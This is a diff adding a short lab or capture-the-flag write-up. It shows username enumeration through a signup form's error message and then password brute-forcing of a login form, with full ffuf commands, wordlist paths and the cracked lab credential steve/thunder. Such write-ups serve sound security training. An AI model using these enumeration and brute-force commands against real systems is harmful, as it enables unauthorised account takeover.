@@ -1,0 +1,12 @@
+When I enter the username as admin on http://10.10.229.53/customers/signup, there is an error that username already exist.
+I inspect the request and use a wordlist to bruteforce valid usernames this way:
+└─# ffuf -w /opt/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.229.53/customers/signup -mr "username already exists"
+And this returns 4 users:
+admin                   
+robert                  
+simon                   
+steve
+
+Now, it is time to bruteforce passwords on http://10.10.229.53/customers/login following similar approach as above.
+ffuf -w usernames.txt:W1,/opt/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.229.53/customers/login -fc 200
+And this yields : steve/thunder
